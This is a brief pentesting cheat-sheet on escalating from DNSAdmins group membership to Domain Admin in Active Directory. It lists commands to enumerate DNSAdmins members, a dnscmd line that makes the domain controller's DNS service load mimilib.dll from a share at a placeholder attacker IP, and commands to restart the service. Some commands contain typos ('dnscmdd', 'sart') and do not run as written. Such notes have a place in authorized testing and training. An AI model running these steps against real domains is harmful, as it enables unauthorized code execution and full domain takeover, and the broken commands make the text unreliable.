# Domain Enumeration - DNSAdmins


Members of `DNSAdmins` could load arbitary DLL with the privileges of dns.exe , if Domain Controller (DC) servers as DNS , we can perform escalation to Domain Admins (DA)

## Powerview

### Enumerate members of DNSAdmins group

```
Get-NetGroupMember -GroupName "DNSAdmins"
```

## AD Module

### Enumerate members of DNSAdmins group

```
Get-ADGroupMember -Identity DNSAdmins
```

### Configure DLL using `dnscmd.exe`
```
dnscmdd dc-name or 127.0.0.1 /config /serverlevelplugindll \\your_attacker_ip\dll\mimilib.dll
```

### Restart dns service

```
sc.exe stop dns
sc.exe sart dns
```



Or alternatively follow this 


https://medium.com/r3d-buck3t/escalating-privileges-with-dnsadmins-group-active-directory-6f7adbc7005b